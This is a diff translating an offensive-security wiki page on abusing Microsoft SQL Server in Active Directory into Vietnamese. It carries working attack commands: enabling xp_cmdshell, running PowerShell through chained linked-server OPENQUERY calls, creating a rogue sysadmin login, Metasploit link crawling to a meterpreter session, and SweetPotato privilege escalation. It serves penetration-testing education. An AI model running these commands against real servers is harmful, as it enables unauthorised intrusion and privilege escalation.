@@ -1,13 +1,13 @@
-# MSSQL AD Abuse
+# Lạm dụng MSSQL AD
 
 {{#include ../../banners/hacktricks-training.md}}
 
 
-## **MSSQL Enumeration / Discovery**
+## **Liệt kê / Khám phá MSSQL**
 
 ### Python
 
-The [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) tool is based on Impacket. It supports authentication with Kerberos tickets and attacks through linked-server chains.<sup>[[1]](#references)</sup>
+Công cụ [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) dựa trên Impacket. Công cụ này hỗ trợ xác thực bằng Kerberos tickets và tấn công thông qua các chuỗi linked-server.<sup>[[1]](#references)</sup>
 
 <figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
   
@@ -81,7 +81,7 @@ mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
 
 ```
 
-### Enumerating from the network without domain session
+### Liệt kê từ mạng mà không cần phiên đăng nhập domain
 
 ```
 
@@ -94,13 +94,13 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 ---
 ### PowerShell
 
-The PowerShell module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) provides discovery, auditing, and exploitation functions for SQL Server environments.<sup>[[2]](#references)</sup>
+Module PowerShell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) cung cấp các chức năng khám phá, kiểm tra và khai thác môi trường SQL Server.<sup>[[2]](#references)</sup>
 
 ```bash
 Import-Module .\PowerupSQL.psd1
 ```
 
-### Enumerating from the network without domain session
+### Liệt kê từ mạng mà không có phiên domain
 
 ```bash
 # Get local MSSQL instance (if any)
@@ -116,7 +116,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
 
-### Enumerating from inside the domain
+### Liệt kê từ bên trong miền
 
 ```bash
 # Get local MSSQL instance (if any)
@@ -143,9 +143,9 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
 
-## MSSQL Basic Abuse
+## Lạm dụng MSSQL cơ bản
 
-### Access DB
+### Truy cập DB
 
 ```bash
 # List databases
@@ -173,14 +173,14 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 
 ### MSSQL RCE
 
-It may also be possible to **execute commands** on the MSSQL host through `xp_cmdshell`.<sup>[[5]](#references)</sup>
+Cũng có thể **thực thi lệnh** trên máy chủ MSSQL thông qua `xp_cmdshell`.<sup>[[5]](#references)</sup>
 
 ```bash
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
 
-Check in the page mentioned in the **following section how to do this manually.**
+Xem trang được đề cập trong **phần sau để biết cách thực hiện thủ công.**
 
 ### MSSQL Basic Hacking Tricks
 
@@ -191,9 +191,9 @@ Check in the page mentioned in the **following section how to do this manually.*
 
 ## MSSQL Trusted Links
 
-If one MSSQL instance trusts another through a linked-server configuration, a user with sufficient permissions can **use that trust relationship to execute queries on the other instance**. These links can be chained, potentially reaching a misconfigured server on which the user can execute commands.<sup>[[3]](#references)</sup>
+Nếu một instance MSSQL tin cậy instance khác thông qua cấu hình linked-server, người dùng có đủ quyền có thể **lợi dụng mối quan hệ tin cậy đó để thực thi truy vấn trên instance còn lại**. Có thể kết nối chuỗi các liên kết này để tiếp cận một server bị cấu hình sai, nơi người dùng có thể thực thi lệnh.<sup>[[3]](#references)</sup>
 
-**The links between databases work even across forest trusts.**
+**Các liên kết giữa các database vẫn hoạt động ngay cả khi có forest trust.**
 
 ### Powershell Abuse
 
@@ -229,7 +229,7 @@ Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_c
 Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
 ```
 
-Another tool that can be used is [**SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn):<sup>[[6]](#references)</sup>
+Một công cụ khác có thể được sử dụng là [**SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn):<sup>[[6]](#references)</sup>
 
 ```bash
 SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
@@ -239,7 +239,7 @@ inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:
 
 ### Metasploit
 
-You can easily check for trusted links using Metasploit.
+Bạn có thể dễ dàng kiểm tra các liên kết đáng tin cậy bằng Metasploit.
 
 ```bash
 #Set username, password, windows auth (if using AD), IP...
@@ -247,41 +247,41 @@ msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
 
-Metasploit tries to abuse only the `OPENQUERY()` function. If command execution through `OPENQUERY()` fails, try the `EXECUTE` method **manually**, as described below.<sup>[[4]](#references)</sup>
+Metasploit chỉ cố khai thác hàm `OPENQUERY()`. Nếu thực thi lệnh qua `OPENQUERY()` thất bại, hãy thử phương thức `EXECUTE` **thủ công** như mô tả bên dưới.<sup>[[4]](#references)</sup>
 
-### Manual - Openquery()
+### Thủ công - Openquery()
 
-From **Linux** you could obtain a MSSQL console shell with **sqsh** and **mssqlclient.py.**
+Từ **Linux**, bạn có thể lấy shell console MSSQL bằng **sqsh** và **mssqlclient.py.**
 
-From **Windows**, you can also find the links and execute commands manually using an **MSSQL client such as** [**HeidiSQL**](https://www.heidisql.com).<sup>[[7]](#references)</sup>
+Từ **Windows**, bạn cũng có thể tìm các liên kết và thực thi lệnh thủ công bằng **MSSQL client như** [**HeidiSQL**](https://www.heidisql.com).<sup>[[7]](#references)</sup>
 
-_Login using Windows authentication:_
+_Đăng nhập bằng xác thực Windows:_
 
-![Metasploit - Manual - Openquery(): Login using Windows authentication](<../../images/image (808).png>)
+![Metasploit - Thủ công - Openquery(): Đăng nhập bằng xác thực Windows](<../../images/image (808).png>)
 
-#### Find Trustable Links
+#### Tìm các liên kết đáng tin cậy
 
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
 ```
 
-![Manual - Openquery() - Find Trustable Links: EXEC sp linkedservers;](<../../images/image (716).png>)
+![Thủ công - Openquery() - Tìm các liên kết đáng tin cậy: EXEC sp linkedservers;](<../../images/image (716).png>)
 
-#### Execute queries in trustable link
+#### Thực thi truy vấn qua liên kết đáng tin cậy
 
-Execute queries through the link (example: find more links in the new accessible instance):
+Thực thi truy vấn thông qua liên kết (ví dụ: tìm thêm liên kết trong instance mới có thể truy cập):
 
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 
 > [!WARNING]
-> Check where double and single quotes are used, it's important to use them that way.
+> Kiểm tra vị trí dùng dấu ngoặc kép và dấu ngoặc đơn, dùng đúng loại rất quan trọng.
 
-![Find Trustable Links - Execute queries in trustable link: Check where double and single quotes are used, it's important to use them that way](<../../images/image (643).png>)
+![Tìm các liên kết đáng tin cậy - Thực thi truy vấn trong liên kết đáng tin cậy: Kiểm tra vị trí dùng dấu ngoặc kép và dấu ngoặc đơn, dùng đúng loại rất quan trọng](<../../images/image (643).png>)
 
-You can continue traversing these trusted-link chains manually.
+Bạn có thể tiếp tục lần theo các chuỗi liên kết đáng tin cậy này theo cách thủ công.
 
 ```sql
 # First level RCE
@@ -291,11 +291,11 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
 
-If you cannot perform actions such as `exec xp_cmdshell` through `OPENQUERY()`, try the `EXECUTE` method.
+Nếu bạn không thể thực hiện các thao tác như `exec xp_cmdshell` thông qua `OPENQUERY()`, hãy thử phương thức `EXECUTE`.
 
-### Manual - EXECUTE
+### Thủ công - EXECUTE
 
-You can also abuse trusted links using `EXECUTE`:
+Bạn cũng có thể abuse các liên kết đáng tin cậy bằng `EXECUTE`:
 
 ```bash
 #Create user and give admin privileges
@@ -303,18 +303,18 @@ EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') 
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
 
-## Local Privilege Escalation
+## Leo thang đặc quyền cục bộ
 
-The **MSSQL service account** often has the **`SeImpersonatePrivilege`** user right, which allows the account to impersonate a client after authentication.
+**Tài khoản dịch vụ MSSQL** thường có quyền người dùng **`SeImpersonatePrivilege`**, cho phép tài khoản giả mạo một client sau khi xác thực.
 
-A strategy that many authors have come up with is to force a SYSTEM service to authenticate to a rogue or man-in-the-middle service that the attacker creates. This rogue service is then able to impersonate the SYSTEM service whilst it's trying to authenticate.
+Một chiến thuật được nhiều tác giả đề xuất là buộc một dịch vụ SYSTEM xác thực với một dịch vụ giả mạo hoặc man-in-the-middle do attacker tạo. Sau đó, dịch vụ giả mạo này có thể giả mạo dịch vụ SYSTEM trong lúc dịch vụ đó đang cố xác thực.
 
-[SweetPotato](https://github.com/CCob/SweetPotato) collects several of these techniques and can be executed through Beacon's `execute-assembly` command.<sup>[[8]](#references)</sup>
+[SweetPotato](https://github.com/CCob/SweetPotato) tổng hợp một số kỹ thuật này và có thể được thực thi thông qua lệnh `execute-assembly` của Beacon.<sup>[[8]](#references)</sup>
 
 
 
-### SCCM Management Point NTLM Relay (OSD Secret Extraction)
-See how the default SQL roles of SCCM **Management Points** can be abused to dump Network Access Account and Task-Sequence secrets directly from the site database:
+### Chuyển tiếp NTLM từ SCCM Management Point (Trích xuất bí mật OSD)
+Tìm hiểu cách các vai trò SQL mặc định của SCCM **Management Points** có thể bị lạm dụng để trích xuất Network Access Account và các bí mật trong Task Sequence trực tiếp từ cơ sở dữ liệu của site:
 
 {{#ref}}
 sccm-management-point-relay-sql-policy-secrets.md
@@ -324,11 +324,10 @@ sccm-management-point-relay-sql-policy-secrets.md
 
 - [1] [ScorpionesLabs – MSSqlPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
 - [2] [NetSPI – PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
-- [3] [Microsoft Learn – Linked servers (Database Engine)](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine?view=sql-server-ver17)
+- [3] [Microsoft Learn – Máy chủ được liên kết (Database Engine)](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine?view=sql-server-ver17)
 - [4] [Microsoft Learn – OPENQUERY](https://learn.microsoft.com/en-us/sql/t-sql/functions/openquery-transact-sql?view=sql-server-ver17)
-- [5] [Microsoft Learn – xp_cmdshell server configuration option](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver17)
+- [5] [Microsoft Learn – Tùy chọn cấu hình máy chủ xp_cmdshell](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver17)
 - [6] [lefayjey – SharpSQLPwn](https://github.com/lefayjey/SharpSQLPwn)
 - [7] [HeidiSQL](https://www.heidisql.com)
 - [8] [CCob – SweetPotato](https://github.com/CCob/SweetPotato)
-
 {{#include ../../banners/hacktricks-training.md}}
